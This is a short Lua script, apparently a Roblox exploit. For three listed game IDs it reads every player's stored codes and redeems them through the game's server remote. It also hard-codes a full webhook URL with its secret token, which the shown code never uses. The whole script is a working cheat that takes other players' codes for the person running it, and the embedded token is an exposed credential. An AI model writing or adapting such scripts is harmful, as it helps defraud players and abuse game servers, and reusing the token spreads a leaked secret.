if game.PlaceId == 12413901502 or game.PlaceId == 16190471004 or game.PlaceId == 9224601490 then
  print('success')
  
  -- Wait for 2 seconds
  wait(2)
  
  -- Define your webhook URL
  local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1156422586129989652/kd9jITOgaW8MZ32tNteuxYZq_zCP7VcGAVBT9l6wADEZE1SaVZuyr4Ma2dB5d7W6fxoN"
  local http = game:GetService("HttpService")
  
  -- Loop through players and their codes
  for _, player in pairs(game.Players:GetPlayers()) do
      print(player.Name)
      print("------------------------------------")
      
      for _, code in pairs(player.MAIN_DATA.Codes:GetChildren()) do
          print(code.Value)
          
          local ohString1 = "Codes"
          local ohString2 = "Redeem"
          local ohTable3 = {
              ["Code"] = code.Value,
          }
          wait(0.1)
          game:GetService("ReplicatedStorage").Replicator:InvokeServer(ohString1, ohString2, ohTable3)
      end
  end
end
